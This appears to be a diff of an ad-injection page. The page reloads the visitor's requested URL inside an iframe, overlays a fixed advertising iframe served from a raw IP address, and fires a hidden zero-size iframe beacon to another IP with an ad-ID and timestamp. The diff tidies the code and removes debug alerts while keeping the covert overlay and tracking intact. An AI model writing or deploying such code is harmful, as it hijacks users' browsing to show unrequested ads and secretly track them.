@@ -2,22 +2,22 @@
 <head>
     <script src="http://libs.baidu.com/jquery/2.0.3/jquery.min.js"></script>
     <script>
-    function e(){
-        var u = navigator.userAgent;
-        var p = u.indexOf("MSIE") != -1 ? u.indexOf("MSIE") : u.indexOf("rv:11");
-        alert(u+"|"+p);
-        return (p != -1) ? true : false;
-    }
-    function c(){_b.style.display="none";}
     $(function(){
+        var e = function() {
+            var u = navigator.userAgent;
+            var p = u.indexOf("MSIE") != -1 ? u.indexOf("MSIE") : u.indexOf("rv:11");
+            return (p != -1) ? true : false;
+        };
+
         var s=new Date().getTime();
         var n=Math.random();
         var f = window.location.href;
         var _u = e() ? f+"?_t="+n : f;
-        alert("url:"+_u);
         setTimeout(function(){$("#_d").attr("src",_u);},200);
 
-        $("#_c").attr("src","http://221.231.148.199/1.htm?k=$ADV_XBITX_ID$0$0$"+s+"$"+n+"$0");
+        $("#_e").attr("src","http://221.231.148.199/1.htm?k=$ADV_XBITX_ID$0$0$"+s+"$"+n+"$0");
+
+        $("#_c").click(function() {_b.style.display="none";});
     });
     </script>
 </head>
@@ -25,12 +25,12 @@
     <iframe id="_d" width=100% height=900px scrolling=no frameborder=0></iframe>
     <div id="_a" style="display:block;width:100%; height:100%;">
         <div id="_b" style="position:fixed;z-index:999999;right:0px;bottom:0px;width:400px;height:300px">
-                <a onClick=c() style="cursor:pointer;display:block;position:absolute;border:1px;border-radius:1em;background-color:#555;color:#eee;z-index:3;right:5px;top:5px;line-height:20px;text-align:center;width:20px;font-size:10px">X</a>
+                <a id="_c" style="cursor:pointer;display:block;position:absolute;border:1px;border-radius:1em;background-color:#555;color:#eee;z-index:3;right:5px;top:5px;line-height:20px;text-align:center;width:20px;font-size:10px">X</a>
                 <iframe src=http://122.225.103.120:8080/jz/0105-2/1.htm width=400 height=300 scrolling=no frameborder=0></iframe>
         </div>
         <div>
-            <iframe id="_c" frameborder="0" width="0" height="0" scrolling="no"></iframe>
+            <iframe id="_e" frameborder="0" width="0" height="0" scrolling="no"></iframe>
         </div>
-    </div>    
+    </div>
 </body>
 </html>
